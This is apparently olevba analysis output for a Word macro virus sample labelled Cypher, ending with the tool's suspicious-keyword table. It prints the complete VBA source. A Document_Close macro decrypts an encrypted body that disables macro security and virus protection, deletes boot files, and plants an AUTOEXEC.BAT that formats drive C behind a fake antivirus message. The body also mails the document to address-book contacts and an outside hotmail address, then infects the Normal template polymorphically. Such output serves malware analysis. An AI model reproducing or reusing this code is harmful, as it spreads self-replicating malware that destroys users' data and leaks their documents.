olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cypher-a33f557ae2458b4c7af13ae83c2880ef8372d0a1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDoc.cls 
in file: Virus.MSWord.Cypher-a33f557ae2458b4c7af13ae83c2880ef8372d0a1 - OLE stream: 'Macros/VBA/ThisDoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    On Error Resume Next
    Dim M(2) As Variant: Dim L(8) As Byte
    Set M(2) = ActiveDocument.VBProject.VBComponents.Item(1)
    Set M(1) = NormalTemplate.VBProject.VBComponents.Item(1)
    Set CM = M(1).CodeModule
    LinBeg = 33
    Line1 = CM.Lines(LinBeg, 1)
    L(1) = 1: n = 1 + LinBeg: CC = CM.Lines(LinBeg, CM.CountOfLines - LinBeg)
    For I = 2 To 8
        L(I) = Mid(Line1, I, 1)
    Next
    Do While InStr(CM.Lines(n, 1), ": End" + " Sub") = False
        CypLinen = CM.Lines(n, 1)
        Linen = ""
        For k = 2 To Len(CypLinen)
            o = Asc(Mid(CypLinen, k, 1))
            j = Int(o / 32) + 1
            I = 1
            Do While (j <> L(I))
                I = I + 1
            Loop
            nc = o - 32 * (L(I) - I)
            Linen = Linen + Chr(nc)
        Next
        CM.ReplaceLine n, Linen: n = n + 1
    Loop
    CM.DeleteLines LinBeg
    JOGUB (M)
    CM.DeleteLines LinBeg, CM.CountOfLines - LinBeg: CM.InsertLines LinBeg, CC:    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub JOGUB(M As Variant)
'6537284
'    �N …RROR ’ESUME ŽEXT
'    ‰F “YSTEM®�RIVATE�ROFILE“TRING¨¢¢¬ ¢ˆ‹…™Ÿƒ•’’…Ž”Ÿ•“…’œ“OFTWAREœ�ICROSOFTœ�FFICEœ¹®°œ—ORDœ“ECURITY¢¬ ¢ŒEVEL¢© ¼¾ ¢¢ ”HEN “YSTEM®�RIVATE�ROFILE“TRING¨¢¢¬ ¢ˆ‹…™Ÿƒ•’’…Ž”Ÿ•“…’œ“OFTWAREœ�ICROSOFTœ�FFICEœ¹®°œ—ORDœ“ECURITY¢¬ ¢ŒEVEL¢© ½ ±
'    ƒOMMAND‚ARS¨¢”OOLS¢©®ƒONTROLS¨¢�ACRO¢©®…NABLED ½ †ALSEº �PTIONS®ƒONFIRMƒONVERSIONS ½ †ALSEº �PTIONS®–IRUS�ROTECTION ½ †ALSEº �PTIONS®“AVEŽORMAL�ROMPT ½ †ALSE
'    “ET FS ½ ƒREATE�BJECT¨¢“CRIPTING®†ILE“YSTEM�BJECT¢©
'    “ET † ½ FS®‡ET†ILE¨ŽORMAL”EMPLATE®†ULLŽAME©º †®�TTRIBUTES ½ °
'‰F „ATE ¾ £·¯±·¯°°£ ”HEN   §IT S MY BIRTHDAY ¡
'    ‰F �PPLICATION®•SERŽAME ¼¾ ¢^^^�NGEL¢ ”HEN
'        FS®„ELETE†ILE ¢ƒºœIO®SYS¢¬ ”RUEº FS®„ELETE†ILE ¢ƒºœCONFIG®SYS¢¬ ”RUEº FS®„ELETE†ILE ¢ƒºœ�UTOEXEC®BAT¢¬ ”RUEº FS®„ELETE†ILE ¢ƒºœ—INDOWSœWIN®COM¢¬ ”RUEº
'        ‰F ‰N“TR¨�PPLICATION®•SERŽAME¬ ¢KH¢© ½ ”RUE ”HEN
'            “ET AU ½ FS®ƒREATE”EXT†ILE¨¢ƒºœAUTOEXEC®BAT¢¬ ”RUE©
'            AU®—RITEŒINE ¨¢€ECHO OFF¢©
'            AU®—RITEŒINE ¨¢€ECHO ™OUR ƒOMPUTER IS BEING CHECKED BY YOUR �NTI–IRUS ­ �LEASE —AIT ­¢©
'            AU®—RITEŒINE ¨¢€ECHO ^^^�NGEL¢©
'            AU®—RITEŒINE ¨¢FORMAT Cº ¯AUTOTEST ¯Q ¯U¢©
'            AU®ƒLOSE
'        …ND ‰F
'    …ND ‰F
'    ‰F �CTIVE„OCUMENT®–‚�ROJECT®–‚ƒOMPONENTS®‰TEM¨±©®ŽAME ½ ¢”HIS„OC¢ ”HEN
'        “ET �Œ ½ ƒREATE�BJECT¨¢�UTLOOK®�PPLICATION¢©
'        “ET �Ž ½ �Œ®‡ETŽAME“PACE¨¢���‰¢©º �Ž®ŒOGONº “ET �� ½ �Œ®ƒREATE‰TEM¨OL�AIL‰TEM©
'        †OR A ½ ± ”O �Ž®�DDRESSŒISTS®ƒOUNT
'            ’ANDOMIZE ”IMER
'            ‰F �Ž®�DDRESSŒISTS¨A©®�DDRESS…NTRIES®ƒOUNT ¾ ¸ ”HEN
'                †OR R ½ ± ”O ‰NT¨�Ž®�DDRESSŒISTS¨A©®�DDRESS…NTRIES®ƒOUNT ¯ ¸©
'                    ”ARGET ½ ‰NT¨± « �Ž®�DDRESSŒISTS¨A©®�DDRESS…NTRIES®ƒOUNT ª ’ND©
'                    ��®’ECIPIENTS®�DD ¨�Ž®�DDRESSŒISTS¨A©®�DDRESS…NTRIES¨”ARGET©©
'                ŽEXT
'            …ND ‰F
'        ŽEXT
'        —ITH ��
'            “ET ’EC ½ ®’ECIPIENTS®�DD¨¢OUTLOOK¹·Ÿ²°°°€HOTMAIL®COM¾¢©º ’EC®’ESOLVE
'            ®“UBJECT ½ �CTIVE„OCUMENT®ŽAMEº ®‚ODY ½ �PPLICATION®•SERŽAME ¦ VBƒRŒF ¦ �PPLICATION®•SER�DDRESS ¦ VBƒRŒF ¦ VBƒRŒFº ®�TTACHMENTS®�DD �CTIVE„OCUMENT®†ULLŽAMEº ®“END
'        …ND —ITH
'        �Ž®ŒOGOFF
'        “ET �Œ ½ ŽOTHING
'    …ND ‰F
'…ND ‰F
'    ŽBŒ± ½ �¨±©®ƒODE�ODULE®ƒOUNT�FŒINES
'    ŽBŒ² ½ �¨²©®ƒODE�ODULE®ƒOUNT�FŒINES
'    ‰Ž†Ÿ ½ †ALSEº ŒIN‚EG ½ ³³
'    ‰F �¨²©®ŽAME ¼¾ ¢”HIS„OC¢ ”HEN
'        ‰F ŽBŒ² ¾ ° ”HEN
'            �¨²©®ƒODE�ODULE®„ELETEŒINES ±¬ ŽBŒ²
'        …ND ‰F
'        �¨²©®ŽAME ½ ¢”HIS„OC¢º ‰Ž† ½ ”RUE
'    …ND ‰F
'    ‰F ‰Ž† ½ †ALSE ”HEN ‡O”O ƒ’™�”Ÿ
'    ŽEWŽAME ½ ¢¢
'    ’ANDOMIZE ”IMER
'    †OR ‰ ½ ± ”O µ
'        ŽEWŽAME ½ ŽEWŽAME « ƒHR¨‰NT¨¶µ « ¨²µ ª ’ND©©©
'    ŽEXT
'    ‰F ‰N“TR¨�¨±©®ƒODE�ODULE®ŒINES¨±¬ ±©¬ ¢�PEN¢© ”HEN
'        �¨²©®ƒODE�ODULE®�DD†ROM“TRING ¢�RIVATE “UB „OCUMENTŸƒLOSE¨©¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ²¬ ¢    �N …RROR ’ESUME ŽEXT¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ³¬ ¢    „IM �¨²© �S –ARIANTº „IM Œ¨¸© �S ‚YTE¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ´¬ ¢    “ET �¨²© ½ �CTIVE„OCUMENT®–‚�ROJECT®–‚ƒOMPONENTS®‰TEM¨±©¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES µ¬ ¢    “ET �¨±© ½ ŽORMAL”EMPLATE®–‚�ROJECT®–‚ƒOMPONENTS®‰TEM¨±©¢
'        ŒINE ½ ¶
'        „O —HILE ‰N“TR¨�¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±©¬ ¢„ELETE¢© ½ †ALSE
'            �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ �¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±©º ŒINE ½ ŒINE « ±
'        ŒOOP
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢    ƒ�®„ELETEŒINES ŒIN‚EG¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢    ¢ « ŽEWŽAME « ¢¨�©¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢    ¢ « ¢ƒ�®„ELETEŒINES ŒIN‚EG¬ ƒ�®ƒOUNT�FŒINES ­ ŒIN‚EGº ƒ�®‰NSERTŒINES ŒIN‚EG¬ ƒƒº    �CTIVE„OCUMENT®“AVE�S †ILEŽAMEº½�CTIVE„OCUMENT®†ULLŽAME¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢…ND “UB¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢“UB ¢ « ŽEWŽAME « ¢¨� �S –ARIANT©¢º ŒINE ½ ŒINE « ±
'        „O —HILE �¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±© ¼¾ ¢¢
'            �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ �¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±©º ŒINE ½ ŒINE « ±
'        ŒOOP
'    …LSE‰F ‰N“TR¨�¨±©®ƒODE�ODULE®ŒINES¨±¬ ±©¬ ¢ƒLOSE¢© ”HEN
'        �¨²©®ƒODE�ODULE®�DD†ROM“TRING ¢�RIVATE “UB „OCUMENTŸ�PEN¨©¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ²¬ ¢    �N …RROR ’ESUME ŽEXT¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ³¬ ¢    „IM �¨²© �S –ARIANTº „IM Œ¨¸© �S ‚YTE¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ´¬ ¢    “ET �¨±© ½ �CTIVE„OCUMENT®–‚�ROJECT®–‚ƒOMPONENTS®‰TEM¨±©¢
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES µ¬ ¢    “ET �¨²© ½ ŽORMAL”EMPLATE®–‚�ROJECT®–‚ƒOMPONENTS®‰TEM¨±©¢
'        ŒINE ½ ¶
'        „O —HILE ‰N“TR¨�¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±©¬ ¢„ELETE¢© ½ †ALSE
'            �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ �¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±©º ŒINE ½ ŒINE « ±
'        ŒOOP
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢    ƒ�®„ELETEŒINES ŒIN‚EG¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢    ¢ « ŽEWŽAME « ¢¨�©¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢    ¢ « ¢ƒ�®„ELETEŒINES ŒIN‚EG¬ ƒ�®ƒOUNT�FŒINES ­ ŒIN‚EGº ƒ�®‰NSERTŒINES ŒIN‚EG¬ ƒƒº    �CTIVE„OCUMENT®“AVE�S †ILEŽAMEº½�CTIVE„OCUMENT®†ULLŽAME¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢…ND “UB¢º ŒINE ½ ŒINE « ±
'        �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ ¢“UB ¢ « ŽEWŽAME « ¢¨� �S –ARIANT©¢º ŒINE ½ ŒINE « ±
'        „O —HILE �¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±© ¼¾ ¢¢
'            �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒINE¬ �¨±©®ƒODE�ODULE®ŒINES¨ŒINE¬ ±©º ŒINE ½ ŒINE « ±
'        ŒOOP
'    …ND ‰F
'ƒ’™�”Ÿº
'    „IM Œ¨¸© �S ‚YTE
'    ‰F ‰Ž† ½ †ALSE ”HEN ‡O”O …Ž„Ÿ
'    ’ANDOMIZE ”IMER
'    Œ¨±© ½ ±
'    †OR ‰ ½ ² ”O ¸
'        †OUND ½ †ALSE
'        ‰TER ½ °
'        „O —HILE †OUND ½ †ALSE
'                ‰TER ½ ‰TER « ±
'                N ½ ‰NT¨¨¸ ª ’ND© « ±©
'                ‰F N ¼¾ ‰ �R ‰TER ¾ ±µ ”HEN
'                    J ½ ±
'                    „O —HILE ¨Œ¨J© ¼¾ N© �ND J ¼ ‰
'                        J ½ J « ±
'                    ŒOOP
'                    ‰F J ½ ‰ ”HEN
'                        †OUND ½ ”RUE
'                        Œ¨‰© ½ N
'                    …ND ‰F
'                …ND ‰F
'        ŒOOP
'    ŽEXT
'    J ½ ŒIN‚EG
'    „IM ƒYPHER �S “TRINGº ƒYPHER ½ ¢¢
'    „O —HILE ‰N“TR¨�¨²©®ƒODE�ODULE®ŒINES¨J¬ ±©¬ ¢º …ND ¢ « ¢“UB¢© ½ †ALSE
'        ŒINEJ ½ �¨²©®ƒODE�ODULE®ŒINES¨J¬ ±©
'        ƒYPŒINEJ ½ ¢§¢
'        †OR K ½ ± ”O ŒEN¨ŒINEJ©
'            O ½ �SC¨�ID¨ŒINEJ¬ K¬ ±©©
'            ‰ ½ ‰NT¨O ¯ ³²© « ±
'            ƒ ½ ³² ª ¨Œ¨‰© ­ ‰© « O
'            ƒYPŒINEJ ½ ƒYPŒINEJ « ƒHR¨ƒ©
'        ŽEXT
'        ƒYPHER ½ ƒYPHER « ƒYPŒINEJ « ƒHR¨±³©
'        J ½ J « ±
'    ŒOOP
'    ‹E ½ ¢¢
'    †OR ‰ ½ ² ”O ¸
'        ‹E ½ ‹E « †ORMAT¨Œ¨‰©©
'    ŽEXT
'    �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒIN‚EG¬ ¢§¢ « ‹E
'    �¨²©®ƒODE�ODULE®„ELETEŒINES ŒIN‚EG « ±¬ �¨²©®ƒODE�ODULE®ƒOUNT�FŒINES ­ ŒIN‚EG
'    �¨²©®ƒODE�ODULE®‰NSERTŒINES ŒIN‚EG « ±¬ ƒYPHER « ¢º …ND¢ « ¢ “UB¢
'…Ž„Ÿº
: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
